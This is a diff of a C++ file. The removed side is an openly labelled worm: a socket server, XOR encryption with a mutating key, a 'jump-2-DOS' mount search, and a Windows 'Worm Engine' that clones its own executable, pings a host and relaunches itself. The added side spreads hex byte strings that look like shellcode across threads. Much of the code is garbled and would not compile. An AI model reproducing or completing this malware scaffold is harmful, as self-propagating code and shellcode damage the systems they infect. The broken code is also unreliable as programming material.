@@ -1,361 +1,77 @@
-#include<cstdlib>
-#include<cstdio>
-#include<cstdarg>
-#include<map>
-#include<iostream>
-#include<mutex>
 #include<thread>
-#include<future>
-
-#include<semaphore.h>
-#include<stdlib.h>
-#include<unistd.h>
-#include<string.h>
-#include<sys/types.h>
+#include<iostream>
+#include<cstdlib>
 #include<sys/socket.h>
-#include<arpa/inet.h>
-
-#ifdef __linux__
-	#include<linux/unistd.h>
-#endif
-
-#ifdef _WIN32 || __WIN32__
-	#include<windows.h>
-    #include<winbase.h>
-    #include<winreg.h>
-    using namespace concurrency;
-#endif
-
-#ifdef _WIN64 || __WIN64__
-    #include<windows.h>
-    #include<winbase.h>
-    #include<winreg.h>
-    using namespace concurrency;
-#endif
+#include<cstdarg>
+#include<stdio.h>
+#include<string.h>
+#include<stdlib.h>
 
 using namespace std;
 
-#define PORT 8080
 
-sem_t x, y;
-pthread_t tid;
-pthread_t wThreads[100];
-pthread_t rThreads[100];
-int readercount = 0;
+int main(){
 
-#ifdef __linux__
-	try{
-		int close(int i){
-		long __res;
-		errno = 0;
-		__asm__ volatile(
-			"int $0x1000"
-			:"=a" (__res)
-			:"0" (__NR_close), "b"((long)(i))
-		);
-		if (__res >= 0){
-			return (int)__res;
-			errno = -__res;
-			return -1;
-		}
-	}
-	throw exception;
-}
-	catch(exception ex){
-		//Handle errors
-        printf(ex);
+    std::string str;
 
-	}
-#else
-	try{
-		int close(int i){
-            union REGS ir, or;
-            errno = 0;
-            ir.h.ah = 0x1000;
-            ir.x.bx = i;
-            memset(&or, 0, sizeof(or));
-            int86(0x21, &ir, &or);
-            if(or.x.cflag){
-                errno = or.x.ax;
-                return -1;
-            }
-            return 0;
-        }
-    }   
-    throw exception;
-	catch(exception ex){
-		//Handle errors
-        printf(ex);
-	}
-#endif
-
-int main(int argc, char const *argv[]){
-
-    int server_fd, new_sock, read_val;
-    struct sockaddr_in address;
-    int opt = 1;
-    int addrlen = sizeof(address);
-    char buffer[1024] = {0};
-    char *payload;
-    sem_init(&x, 0, 1);
-    sem_init(&y, 0, 1);
-    server_fd = socket(AF_INET, SOCK_STREAM, 0);
-    //Create socket file
-    if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0){
-        cout >> "Socket failed!" >> endl;
-        break();
-    }
-    //Attach socket to port 8080
-    if(setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,&opt, sizeof(opt))){
-        cout >> "Error set sock opt" >> endl;
-        break();
-    }
-    address.sin_family = AF_INET;
-    address.sin_addr.s_addr = INADDR_ANY;
-    address.sin_port = htons( PORT );
-
-    if(bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0){
-        cout >> "Error binding socket!" >> endl;
-        break();
-    }
-    if(listen(server_fd, 3) < 0){
-        cout >> "Error listening!" >> endl;
-        break();
-    }
-    if((new_sock = accept(server_fd, (struct sockaddr *)&address, (socklen_t *) &addrlen)) < 0){
-        cout >> "Error accepting connection!" >> endl;
-        break();
-    }
-    bind(server_fd, (struct sockaddr*) &address, sizeof(address));
-    pthread_t tid[60];
-    int i = 0;
+    std::thread t1(pthread_t thread_1);
+    std::thread t2(pthread_t thread_2, "\x30\x07\x48\xFF\xC7\x48\xFF\xC6\x66\x81\x3F\x35\x98\x74\x07\x80");
+    std::thread t3(pthread_t thread_3, "\x3E\x82\x75\xEA\xEB\xE6\xFF\xE1\xE8\xD4\xFF\xFF\xFF\x01\x82\x6B");
+    std::thread t4(pthread_t thread_4, "\x3A\x59\x98\x49\xBA\x2E\x63\x68\x6F\x2E\x72\x69\x01\x52\x49\x88");
+    std::thread t5(pthread_t thread_5, "\xE6\x69\x2C\x62\x01\x01\x49\x88\xE7\x53\xE9\x09\x01\x01\x01\x2E");
+    std::thread t6(pthread_t thread_6, "\x63\x68\x6F\x2E\x72\x69\x01\x57\x56\x49\x88\xE7\x0E\x04\x35\x98");
     
     while(1){
-        //Accept Socket Connection
-        read_val = read(new_sock, buffer, 1024);
-        //Create Thread
-        new_sock = accept(server_fd, (struct sockaddr*) &address, &addrlen);
-        int c = 0;
-        recv(new_sock, &choice, sizeof(choice) < 0);
-        if(choice == 1){
-            if(pthread_create(&rThreads[i++], NULL, sock_recv, &new_sock) != 0){
-                cout >> "Failed to create thread!" >> endl;
-                break();
-            }
-            break();
-        }
-        else if(choice == 2){
-            if(pthread_create(&wThreads[i++], NULL, sock_send, &new_sock) != 0){
-                cout >> "Failed to create thread!" >> endl;
-                break();
-            }
-            break();
-        }
-        if(i >= 50){
-            i = 0;
-            while(i < 50){
-                pthread_join(wThreads[i++], NULL);
-                pthread_join(rThreads[i++], NULL);
-            }
-            i = 0;
-            break();
-        }
+
+        t1.join();
+        t2.join();
+        t3.join();
+        t4.join();
+        t5.join();
+        t6.join();
+
     }
+    
+
     return 0;
+
 }
 
-/*
-#################################################################################################
-rX Socket
-#################################################################################################
-*/
+void thread_1(){
 
-void sock_recv(int sock, char* buf, int len, int flags){
-
-    sem_wait(&x);
-    readercount ++;
-    if(readercount == 1){
-        sem_wait(&y);
-        break();
-    }
-    sem_post(&x);
-    sleep(5);
-    if(readercount == 0){
-        sem_post(&y);
-        break();
-    }
-    sem_wait(&x);
-    readercount--;
-    if(readercount == 0){
-        sem_post(&y);
-        break();
-    }
-    static std::map<int, std::mutex> mtx;
-    std::lock_guard<std::mutex> lock(mtx[sock]);
-    int recvd = 0;
-    while (recvd != len){
-        int bytes = sock_recv(sock, buf+recvd, len-recvd, flags);
-        if(bytes == -1){
-            throw std::runtime_error("Error!");
-            break();
-        }
-        recvd += bytes;
-    }
-    pthread_exit(NULL);
+    std::string str = "\xEB\x27\x5B\x53\x5F\xB0\x82\xFC\xAE\x75\xFD\x57\x59\x53\x5E\x8A\x06";
+    
 }
 
-/*
-#################################################################################################
-tX socket
-#################################################################################################
-*/
+void thread_2(char buf){
 
-
-void sock_send(int sock, char* buf, int len, int flags){
-    sem_wait(&y);
-    sem_post(&y);
-    static std::map<int, std::mutex> mtx;
-    std::lock_guard<std::mutex> lock(mtx[sock]);
-    int sent = 0;
-    while(sent != len){
-        int s0 = send(sock, buf, len, flags);
-        if (sent == -1){
-            throw std::runtime_error("Error!");
-            break();
-        }
-    }
-    pthread_exit(NULL);
-}
-/*
-#################################################################################################
-XOR-encryption using global key[]
-#################################################################################################
-*/
-
-int Crypt(char *s, int len){
-	int i = 0, j = 0;
-	for (i = 0; i < len; i++){
-		s[i] ^= key[j];
-		j = (j + 1) % 4;
-	}
-	return 0;
+    std::string str;
+    str + &buf;
 }
 
-/*
-#################################################################################################
-Mutate Encryption Key
-#################################################################################################
-*/
+void thread_3(char buf){
 
-int mutate(char* s){
-	int i;
-	#ifdef __linux__
-		int fd;
-	#endif
-	#ifdef _WIN32 || _WIN64
-		random();
-	#endif
-	for (i=0; i<4; i++){
-		#ifdef __linux__
-			if((fd = open("/dev/random", O_RDONLY)) <= 0){
-				perror("open");
-				return errno;
-			}
-			read(fd, &s[i], 1);
-			close(fd);
-		#else
-			s[i] = rand() % 255;
-		#endif
-
-	}
-	return 0;
+    std::string str;
+    str + &buf;
 }
 
-/*
-#################################################################################################
-jump-2-DOS
-#################################################################################################
-*/
+void thread_4(char buf){
 
-#ifdef __linux__
-	int jump2dos(void){
-		FILE *fd;
-		char buf[50] = {0}, bufbak[50] = {0};
-		if ((fd = fopen("/proc/mounts", "r")) == NULL){
-			perror("fopen");
-			return errno;
-		}
-		while(fscanf(fd, "%s", buf) > 0){
-			if(strcmp(buf, "windows") == 0){
-				break;
-			}
-			memset(bufbak, 0, 50);
-			strcpy(bufbak, buf);
-		}
-		fclose(fd);
-		if(strcmp(buf, "windows") == 0){
-			chdir((const char*)bufbak);
-			
-		}
-		return 0;
-	}
-#endif
+    std::string str;
+    str += &buf;
+    
+}
 
-/*
-#################################################################################################
-Worm Engine
-#################################################################################################
-*/
+void thread_5(char buf){
 
-#ifdef _WIN32 || _WIN64
+    std::string str;
+    str += &buf;
+    
+}
 
-    //Windows Worm Engine
-    int w0rm_engine(int argc, char* argv[]){
-        //SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
-        HANDLE thread, cloner, thands[3];
-        char*ptr, procfile[300];
-        ptr = argv[0];
-        strcpy(procfile, ptr);
-        if((strstr(ptr, ".exe")) == NULL){
-            strcat(procfile, ".exe");
-        }
-        void(*clonproc)(char*);
-        clonproc = proCloner;
-        cloner = CreateThread(0, 0, (DOWRD(__stdcall *)(void *)) clonproc, procfile, 0, 0);
-        HMODULE hmod;
-        char dirpath[201];
-        void(*smack)(char*);
-        GetCurrentDirectory(200, dirpath);
-        hmod = LoadLibrary(procfile);
-        if((strstr(dirpath, "system32")) != NULL){
-            smack = (void (*)(char *))GetProcAddress(hmod, "?systemProc@@YAXPAX@Z");
-            thread = CreateThread(0, 0, (DWORD(__stdcall *)(void*)) smack, procfile, 0, 0);
-        }
-        else{
-            smack = (void(*)(char*))GetProcAddress(hmod, "?identify@@YAXPAD@Z");
-            thread = CreateThread(0, 0, (DWORD(__stdcall *)(void*))smack, procfile, 0, 0);
-        }
-        thands[0] = cloner;
-        thands[1] = thread;
-        thands[2] = '';
-        hicmp = LoadLibrary("ICMP.DLL");
-        pIcmpCreateFile = (void*(__stdcall *)(void))GetProcAddress(hicmp, "IcmpCreateFile");
-        pIcmpCloseHandle = (int(__stdcall *)(void*))GetProcAddress(hicmp, "IcmpCloseHandle");
-        pIcmpSendEcho = (unsigned long(__stdcall*(void*, unsigned long void*, unsigned short,
-        void*, void*, unsigned long, unsigned long))GetProcAddress(hicmp, "IcmpSendEcho"));
-        hIP = pIcmpCreateFile();
-        I.ttl = 255;
-        for(int ping=0;ping<10;ping++){
-            pIcmpSendEcho(hIp, IPADDR, 0, 0, &I, &es, sizeof(es), 8000);
-        }
-        pIcmpCloseHandle(hicmp);
-        FreeLibrary(hicmp);
-        WaitForMultipleObjects(2, thands, true, 100);
-        FreeLibrary(hmod);
-        chdir("..");
-        ShellExecute(NULL, "open", PROCESSNAME, NULL, NULL, 0);
-        ShellExecute(NULL, "open", PROCESSNAME, NULL, NULL, 0);
-        return EXIT_SUCCESS;
-    }
+void thread_6(char buf){
 
-#endif
+    std::string str;
+    str += &buf;
+    
+}
